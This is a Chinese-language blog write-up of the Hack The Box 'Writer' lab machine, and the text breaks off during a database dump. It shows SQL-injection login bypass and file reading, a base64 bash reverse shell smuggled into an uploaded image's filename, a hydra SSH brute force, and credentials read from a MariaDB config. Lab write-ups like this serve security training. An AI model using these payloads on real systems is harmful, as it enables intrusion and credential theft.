<!DOCTYPE html>
<html>
<head>
    

    

    



    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
    
    
    
    
    <title>Writer - Hackthebox | Lucifiel&#39;s Blog | Lucifiel æŠ€æœ¯åšå®¢</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="Hackthebox">
    <meta name="description" content="Hackthebox - Writeré¶åœºä¿¡æ¯                                                                                                            é¶åœºç±»å‹">
<meta property="og:type" content="article">
<meta property="og:title" content="Writer - Hackthebox">
<meta property="og:url" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/index.html">
<meta property="og:site_name" content="Lucifiel&#39;s Blog">
<meta property="og:description" content="Hackthebox - Writeré¶åœºä¿¡æ¯                                                                                                            é¶åœºç±»å‹">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image1.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image2.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image3.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image4.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image5.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image6.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image7.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image8.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image9.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image10.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image11.png">
<meta property="og:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image12.png">
<meta property="article:published_time" content="2021-08-06T11:38:36.000Z">
<meta property="article:modified_time" content="2023-05-20T03:30:36.000Z">
<meta property="article:author" content="Lucifiel">
<meta property="article:tag" content="Hackthebox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://www.lucifiel.com/2021/08/06/Hackthebox%20-%20Writer/image1.png">
    
        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>

<body>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Lucifiel</h5>
          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                ä¸»é¡µ
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/LucifielHack" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">Writer - Hackthebox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="è¾“å…¥æ„Ÿå…´è¶£çš„å…³é”®å­—">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">Writer - Hackthebox</h1>
        <h5 class="subtitle">
            
                <time datetime="2021-08-06T11:38:36.000Z" itemprop="datePublished" class="page-time">
  2021-08-06
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Writer"><span class="post-toc-text">Hackthebox - Writer</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºä¿¡æ¯"><span class="post-toc-text">é¶åœºä¿¡æ¯</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#é¶åœºç±»å‹"><span class="post-toc-text">é¶åœºç±»å‹</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#ä¿¡æ¯æœé›†"><span class="post-toc-text">ä¿¡æ¯æœé›†</span></a></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-Hackthebox - Writer"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">Writer - Hackthebox</h1>
        <div class="post-meta">
            <time class="post-time" title="2021-08-06 19:38:36" datetime="2021-08-06T11:38:36.000Z"  itemprop="datePublished">2021-08-06</time>

            


            
<span id="busuanzi_container_page_pv" title="æ–‡ç« æ€»é˜…è¯»é‡" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="Hackthebox-Writer"><a href="#Hackthebox-Writer" class="headerlink" title="Hackthebox - Writer"></a>Hackthebox - Writer</h1><h2 id="é¶åœºä¿¡æ¯"><a href="#é¶åœºä¿¡æ¯" class="headerlink" title="é¶åœºä¿¡æ¯"></a>é¶åœºä¿¡æ¯</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image1.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="é¶åœºç±»å‹"><a href="#é¶åœºç±»å‹" class="headerlink" title="é¶åœºç±»å‹"></a>é¶åœºç±»å‹</h2><figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image2.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h2><p>ä½¿ç”¨nmapè¿›è¡Œä¿¡æ¯æœé›†</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# nmap -A -sS -sC -sV -p- 10.10.11.101
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-05 03:27 CST
Nmap scan report for 10.10.11.101
Host is up (0.23s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 98:20:b9:d0:52:1f:4e:10:3a:4a:93:7e:50:bc:b8:7d (RSA)
|   256 10:04:79:7a:29:74:db:28:f9:ff:af:68:df:f1:3f:34 (ECDSA)
|_  256 77:c4:86:9a:9f:33:4f:da:71:20:2c:e1:51:10:7e:8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/5%OT=22%CT=1%CU=34682%PV=Y%DS=2%DC=T%G=Y%TM=610AEB60
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11
OS:NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 12m51s
|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-08-04T19:45:33
|_  start_date: N/A

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   259.68 ms 10.10.14.1
2   259.76 ms 10.10.11.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 298.54 seconds
</code></pre>
<p>å’±ä»¬å»80ç«¯å£çš„HTTPæœåŠ¡çœ‹ä¸€ä¸‹</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image3.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>åœ¨äººå·¥æŸ¥çœ‹ä»¥åï¼Œæˆ‘å‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆçªç ´ï¼Œå’±ä»¬å…ˆåšä¸ªç›®å½•fuzzå§</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -t 100 -u http://10.10.11.101/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.101/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/08/05 04:22:00 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.11.101/about                (Status: 200) [Size: 3522]
http://10.10.11.101/contact              (Status: 200) [Size: 4905]
http://10.10.11.101/static               (Status: 301) [Size: 313] [--&gt; http://10.10.11.101/static/]
http://10.10.11.101/logout               (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]
http://10.10.11.101/dashboard            (Status: 302) [Size: 208] [--&gt; http://10.10.11.101/]
http://10.10.11.101/administrative       (Status: 200) [Size: 1443]
http://10.10.11.101/server-status        (Status: 403) [Size: 277]

===============================================================
2021/08/05 04:32:00 Finished
===============================================================
</code></pre>
<p>å‘ç°æœ‰ä¸€ä¸ª</p>
<pre><code class="Plain">administratortive
</code></pre>
<p>ç›®å½•ï¼Œå’±ä»¬è¿›å…¥æŸ¥çœ‹ä¸€ä¸‹</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image4.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>æ˜¯ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œæˆ‘æµ‹è¯•äº†ä¸€ä¸‹å¼±å£ä»¤ï¼Œå¹¶ä¸å­˜åœ¨</p>
<p>ç„¶åç»è¿‡æˆ‘å¤§é‡çš„æµ‹è¯•ä»¥åï¼Œå‘ç°è¿™ä¸ªç™»å½•é¡µé¢å­˜åœ¨Sqlæ³¨å…¥ï¼Œä¸”å¯ç”¨ä¸‡èƒ½å¯†ç è¿›è¡Œç™»å½• ## æ¼æ´åˆ©ç”¨</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image5.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image6.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>å’±ä»¬å¯¹æ¯”ä¸€ä¸‹è¿™ä¸¤ä¸ªçš„åŒºåˆ«ï¼Œå¯ä»¥å‘ç°</p>
<pre><code class="Plain">admin&#39;order by 6;--+
</code></pre>
<p>æ˜¯æ‰§è¡ŒæˆåŠŸäº†ï¼Œæç¤ºå’±ä»¬</p>
<pre><code class="Plain">Welecome admin
</code></pre>
<p>ï¼Œæ‰€ä»¥ç¡®å®šå­˜åœ¨æ³¨å…¥</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image7.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>é€šè¿‡è¿›è¡Œç»†è‡´çš„æ‰‹å·¥æ³¨å…¥åå‘ç°ï¼Œè¯¥æ³¨å…¥ç‚¹ç¬¬äºŒé¡¹å¯è¢«æ˜¾ç¤ºå’±ä»¬åˆ©ç”¨è¿™ä¸ªç‚¹æ¥è¿›è¡Œåˆ©ç”¨</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image8.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>ç»è¿‡å¤§é‡çš„æµ‹è¯•åï¼Œå‘ç°è¯¥æ³¨å…¥ç‚¹å¯ç”¨æ¥è¯»å–æ–‡ä»¶</p>
<pre><code class="Plain">/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
john:x:1001:1001:,,,:/home/john:/bin/bash
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
</code></pre>
<p>å’±ä»¬å»ç™»å½•ä¸€ä¸‹åå°çœ‹ä¸€ä¸‹ï¼Œä½¿ç”¨ä¸‡èƒ½å¯†ç </p>
<pre><code class="Plain">username = admin&#39;;--+
password = password
</code></pre>
<p>ç™»å½•æˆåŠŸ</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image9.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>æˆ‘å‘ç°è¯¥åå°æœ‰ä¸Šä¼ åŠŸèƒ½ï¼Œä¸è¿‡åªèƒ½ä¸Šä¼ å›¾ç‰‡</p>
<p>ä¸è¿‡æ²¡æœ‰å…³ç³»ï¼Œå’±ä»¬åˆ¶ä½œä¸€ä¸ªå›¾ç‰‡é©¬å°±å¯ä»¥äº†</p>
<pre><code class="Plain">step 1
echo -n &#39;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.110/9001 0&gt;&amp;1&quot;&#39; | base64
å°†åå¼¹shellçš„è¯­å¥è½¬æ¢ä¸ºbase64æ ¼å¼

step 2
éšä¾¿å‡†å¤‡ä¸€å¼ å›¾ç‰‡ï¼Œæˆ‘è¿™é‡Œå°±ç”¨çš„1.jpg

step 3
touch &#39;1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzkwMDEgMD4mMSI=| base64 -d | bash`;&#39;
å°†å›¾ç‰‡å’Œæœ¨é©¬ç»‘å®šåœ¨ä¸€èµ·ï¼Œç”Ÿæˆä¸€ä¸ªå›¾ç‰‡é©¬çš„æ ¼å¼(ä¸¥æ ¼æ„ä¹‰ä¸Šè¯´ä¸æ˜¯å›¾ç‰‡é©¬ï¼Œæ¯•ç«Ÿåªæ˜¯ä¸€ä¸ªåç¼€ç»•è¿‡)

step 4
file:///var/www/writer.htb/writer/static/img/1.jpg; `echo L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTEwLzkwMDEgMD4mMSI=| base64 -d | bash`;#
ä¸Šä¼ çš„æ—¶å€™æ‰€ä½¿ç”¨çš„æ‰§è¡Œè¯­å¥

step 5
nc -nvlp 9001
ä½¿ç”¨ncç›‘å¬ç«¯å£
</code></pre>
<p>ä¸Šé¢æ˜¯ä¸€ä¸ªå¤§è‡´çš„åˆ©ç”¨æ­¥éª¤ï¼Œå’±ä»¬ç°åœ¨æ¥è¯¦ç»†è¿›è¡Œåˆ©ç”¨</p>
<p>é¦–å…ˆå‰ä¸‰æ­¥ç”Ÿæˆå›¾ç‰‡é©¬å°±ä¸è¯´äº†ï¼Œç¨å¾®ä¿®æ”¹ä¸€ä¸‹æŒ‡ä»¤ç„¶åè¾“å…¥å³å¯</p>
<p>åœ¨è¿›å…¥ç¬¬å››æ­¥ä¹‹å‰ï¼Œå’±ä»¬éœ€è¦å…ˆç™»å…¥åå°</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image10.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>ç„¶åä¿®æ”¹ä¸€ç¯‡æ–‡ç« </p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image11.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>ä¿®æ”¹è¿‡ç¨‹ä¸­ç„¶åä¸Šä¼ æˆ‘ä»¬åˆ¶ä½œçš„æœ¨é©¬</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="/2021/08/06/Hackthebox%20-%20Writer/image12.png" alt title>
                </div>
                <div class="image-caption"></div>
            </figure>

<p>ç„¶åæˆ‘ä»¬ä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ…ï¼Œç„¶åå†è¿›è¡Œä¿®æ”¹</p>
<p>ä¿®æ”¹åä»¥åï¼Œä½¿ç”¨ncç›‘å¬æˆ‘ä»¬æŒ‡å®šçš„ç«¯å£ï¼Œç„¶åæ‰§è¡Œæµé‡åŒ…å³å¯</p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.110] from (UNKNOWN) [10.10.11.101] 48906
bash: cannot set terminal process group (1061): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ whoami&amp;&amp;id
whoami&amp;&amp;id
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<p>æˆåŠŸè·å¾—ä¸€ä¸ªwww-dataæƒé™çš„shell</p>
<p>è‡³äºä¸Šé¢ç”¨åˆ°çš„å›¾ç‰‡çš„è·¯å¾„æ€ä¹ˆå¾—æ¥çš„ï¼Œå’±ä»¬åœ¨ä¹‹å‰çˆ†ç ´çš„æ—¶å€™è·å¾—äº†ä¸€ä¸ª<code>/static</code>è·¯å¾„ï¼Œè¿›å…¥åå‘ç°å¯ä»¥ç›®å½•éå†</p>
<pre><code class="Plain">http://10.10.11.101/static/img/
</code></pre>
<p>å’±ä»¬åœ¨è¿™ä¸ªè·¯å¾„å³å¯çœ‹åˆ°æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå†åˆ©ç”¨sqlæ³¨å…¥å¤„çš„æ–‡ä»¶è¯»å–è¯»å–é…ç½®æ–‡ä»¶ï¼Œå³å¯çŸ¥é“ç»å¯¹è·¯å¾„</p>
<p>æš‚æ—¶åœ¨è¿™åˆå¡å£³äº†ï¼ŒæŸ¥çœ‹ä¸€ä¸‹homeç›®å½•</p>
<pre><code class="Plain">www-data@writer:/home$ ls
ls
john  kyle
</code></pre>
<p>è¿™é‡Œæœ‰ä¸¤ä¸ªæ€è·¯</p>
<ol>
<li>ä½¿ç”¨hydraçˆ†ç ´kyleçš„å¯†ç </li>
<li>è¯»å–mysqlçš„é…ç½®ï¼Œç›´æ¥è¿›æ•°æ®åº“æ‹¿kyleçš„hash</li>
</ol>
<p>å’±ä»¬å…ˆæ¥çœ‹çœ‹ç¬¬ä¸€ä¸ªï¼Œhydraçˆ†ç ´å¯†ç </p>
<pre><code class="Plain">â”Œâ”€â”€(rootğŸ’€root)-[~/Desktop]
â””â”€# hydra -l kyle -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt 10.10.11.101 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-05 05:16:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 9437 login tries (l:1/p:9437), ~590 tries per task
[DATA] attacking ssh://10.10.11.101:22/
[STATUS] 121.00 tries/min, 121 tries in 00:01h, 9318 to do in 01:18h, 16 active
[STATUS] 112.33 tries/min, 337 tries in 00:03h, 9102 to do in 01:22h, 16 active
[STATUS] 99.71 tries/min, 698 tries in 00:07h, 8741 to do in 01:28h, 16 active
[STATUS] 97.27 tries/min, 1459 tries in 00:15h, 7980 to do in 01:23h, 16 active
[STATUS] 96.23 tries/min, 2983 tries in 00:31h, 6456 to do in 01:08h, 16 active
[STATUS] 96.04 tries/min, 4514 tries in 00:47h, 4925 to do in 00:52h, 16 active
[STATUS] 95.70 tries/min, 6029 tries in 01:03h, 3410 to do in 00:36h, 16 active
[STATUS] 95.49 tries/min, 7544 tries in 01:19h, 1895 to do in 00:20h, 16 active
[STATUS] 95.18 tries/min, 9042 tries in 01:35h, 397 to do in 00:05h, 16 active
[22][ssh] host: 10.10.11.101   login: kyle   password: marcoantonio
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-05 06:55:10
</code></pre>
<p>ç„¶åæ˜¯ç¬¬äºŒä¸ªï¼Œè¿›å…¥æ•°æ®åº“æ‹¿kyleçš„hash</p>
<pre><code class="Plain">www-data@writer:/$ cd /etc/mysql
cd /etc/mysql
www-data@writer:/etc/mysql$ ls
ls
conf.d
debian-start
debian.cnf
mariadb.cnf
mariadb.conf.d
my.cnf
my.cnf.fallback
www-data@writer:/etc/mysql$ cat mariadb.cnf
cat mariadb.cnf
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. &quot;/etc/mysql/mariadb.cnf&quot; (this file) to set global defaults,
# 2. &quot;/etc/mysql/conf.d/*.cnf&quot; to set global options.
# 3. &quot;/etc/mysql/mariadb.conf.d/*.cnf&quot; to set MariaDB-only options.
# 4. &quot;~/.my.cnf&quot; to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
</code></pre>
<p>æ‹¿åˆ°mysqlæ•°æ®åº“è´¦å·å¯†ç ï¼Œè¿›å…¥æ•°æ®åº“æ‹¿kyleç”¨æˆ·çš„hashå€¼</p>
<pre><code class="Plain">www-data@writer:/etc/mysql$ mysql -u djangouser -h 127.0.0.1 -p
mysql -u djangouser -h 127.0.0.1 -p
Enter password: DjangoSuperPassword

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1508
Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.

MariaDB [dev]&gt; show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| dev                |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [dev]&gt; use dev;
use dev;
Database changed
MariaDB [dev]&gt; show tables;
show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.000 sec)

MariaDB [dev]&gt; SELECT * FROM auth_user;
SELECT * FROM auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
